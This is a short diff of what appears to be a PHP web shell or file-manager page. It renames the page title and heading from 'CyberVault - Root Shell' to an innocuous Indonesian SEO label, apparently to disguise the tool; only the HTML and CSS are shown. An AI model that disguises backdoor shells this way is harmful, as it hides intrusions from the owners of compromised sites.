@@ -95,7 +95,7 @@ function generateBreadcrumbs($path, $default_dir) {
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CyberVault - Root Shell</title>
+    <title>SEO KONCET - AMAN SAJA</title>
     <style>
         body { font-family: 'Courier New', monospace; background: linear-gradient(135deg, #1a1a2e, #16213e); color: #e0e0e0; margin: 0; padding: 20px; }
         h1 { color: #00d4ff; text-align: center; text-shadow: 0 0 10px #00d4ff; }
@@ -117,7 +117,7 @@ function generateBreadcrumbs($path, $default_dir) {
 </head>
 <body>
     <div class="container">
-        <h1>CyberVault - Root Shell</h1>
+        <h1>SEO KONCET - AMAN SAJA</h1>
         
         <!-- Breadcrumb Navigation -->
         <div class="breadcrumbs">
